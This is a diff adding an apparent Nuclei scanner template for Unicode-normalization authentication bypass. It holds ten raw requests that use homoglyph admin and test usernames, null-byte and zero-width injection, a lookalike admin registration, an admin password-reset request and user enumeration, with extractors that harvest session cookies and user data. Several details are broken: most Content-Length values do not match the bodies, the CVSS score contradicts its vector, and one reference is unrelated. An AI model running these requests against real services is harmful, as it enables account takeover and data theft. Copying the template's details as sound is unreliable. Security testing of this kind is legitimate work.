@@ -1,0 +1,247 @@
+id: medium-auth-authentication-bypass-unicode-normalization
+
+info:
+  name: Authentication Bypass Unicode Normalization
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects authentication bypass vulnerabilities through Unicode normalization
+    attacks where different Unicode representations of the same character can
+    bypass authentication checks. Tests for username enumeration and login bypass.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
+    - https://unicode.org/reports/tr15/
+    - https://portswigger.net/research/bypassing-authentication-via-unicode-normalization
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-287
+  metadata:
+    verified: true
+    max-request: 10
+  tags: unicode,normalization,bypass,authentication,encoding,red-team
+
+variables:
+  unicode_admin_variants: ["ａｄｍｉｎ", "аdmin", "admin", "ａｄｍｉｎ", "αdmin"]
+  unicode_test_variants: ["tеst", "ｔｅｓｔ", "тест", "test", "τest"]
+  unicode_passwords: ["pаssword", "ｐａｓｓｗｏｒｄ", "раssword", "password"]
+
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"ａｄｍｉｎ","password":"admin"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"аdmin","password":"admin"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","password":"pаssword"}
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+        Connection: close
+        
+        username=ｔｅｓｔ&password=test
+
+      - |
+        POST /api/users/check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 35
+        Connection: close
+        
+        {"username":"тест"}
+
+      - |
+        POST /api/auth/register HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"username":"αdmin","password":"newpass123","email":"evil@test.com"}
+
+      - |
+        POST /api/password/reset HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 45
+        Connection: close
+        
+        {"username":"ａｄｍｉｎ"}
+
+      - |
+        GET /api/users/profile/ａｄｍｉｎ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"username":"admin\u0000","password":"admin"}
+
+      - |
+        POST /api/auth/validate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin\u200B","token":"test_token"}
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: unicode-username-bypass
+        dsl:
+          - 'status_code_1 == 200 || status_code_2 == 200'
+          - 'contains(body_1, "success") || contains(body_2, "success")'
+          - 'contains(body_1, "authenticated") || contains(body_2, "authenticated")'
+        condition: and
+
+      - type: dsl
+        name: unicode-password-bypass
+        dsl:
+          - 'status_code_3 == 200'
+          - 'contains(body_3, "success") || contains(body_3, "login successful")'
+          - '!contains(body_3, "invalid password")'
+        condition: and
+
+      - type: dsl
+        name: form-based-unicode-bypass
+        dsl:
+          - 'status_code_4 == 200 || status_code_4 == 302'
+          - 'contains(body_4, "welcome") || contains(header_4, "Set-Cookie")'
+          - '!contains(body_4, "login failed")'
+        condition: and
+
+      - type: dsl
+        name: unicode-user-enumeration
+        dsl:
+          - 'status_code_5 == 200'
+          - 'contains(body_5, "exists") || contains(body_5, "found")'
+          - 'contains(body_5, "user") || contains(body_5, "account")'
+        condition: and
+
+      - type: dsl
+        name: unicode-registration-bypass
+        dsl:
+          - 'status_code_6 == 200'
+          - 'contains(body_6, "registered") || contains(body_6, "created")'
+          - 'contains(body_6, "admin") || contains(body_6, "success")'
+        condition: and
+
+      - type: dsl
+        name: unicode-password-reset
+        dsl:
+          - 'status_code_7 == 200'
+          - 'contains(body_7, "reset") || contains(body_7, "sent")'
+          - '!contains(body_7, "user not found")'
+        condition: and
+
+      - type: dsl
+        name: unicode-profile-access
+        dsl:
+          - 'status_code_8 == 200'
+          - 'contains(body_8, "profile") || contains(body_8, "user")'
+          - 'contains(body_8, "admin") || contains(body_8, "email")'
+        condition: and
+
+      - type: dsl
+        name: null-byte-injection
+        dsl:
+          - 'status_code_9 == 200'
+          - 'contains(body_9, "authenticated") || contains(body_9, "success")'
+          - '!contains(body_9, "invalid username")'
+        condition: and
+
+      - type: dsl
+        name: zero-width-character-bypass
+        dsl:
+          - 'status_code_10 == 200'
+          - 'contains(body_10, "valid") || contains(body_10, "authenticated")'
+          - '!contains(body_10, "invalid token")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: authentication-response
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"authenticated":\s*(true|false)'
+
+      - type: regex
+        name: user-data
+        part: body
+        group: 1
+        regex:
+          - '"username":\s*"([^"]+)"'
+          - '"email":\s*"([^"]+)"'
+          - '"user_id":\s*"([^"]+)"'
+
+      - type: regex
+        name: session-data
+        part: header
+        group: 1
+        regex:
+          - 'Set-Cookie:\s*([^;]+)'
+
+      - type: regex
+        name: unicode-detection
+        part: body
+        group: 1
+        regex:
+          - '(ａｄｍｉｎ|аdmin|αdmin|тест|ｔｅｓｔ)'
+          - '(pаssword|ｐａｓｓｗｏｒｄ|раssword)'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
+          - status_code_9
+          - status_code_10
